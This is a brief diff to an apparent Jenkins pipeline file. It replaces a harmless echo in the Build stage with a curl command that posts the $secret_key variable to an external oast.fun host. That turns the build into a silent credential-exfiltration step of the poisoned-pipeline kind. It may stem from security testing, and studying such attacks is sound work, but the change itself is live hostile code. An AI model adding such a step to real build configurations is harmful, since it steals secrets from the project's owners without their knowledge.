@@ -6,7 +6,7 @@ pipeline {
     stages {
         stage('Build') {
             steps {
-              sh 'echo TestingBuild'
+              sh 'curl -d env="$secret_key" ccf3bxf2vtc0000xah7ggg8ti6ayyyyyb.oast.fun'
                 }
             }
         }
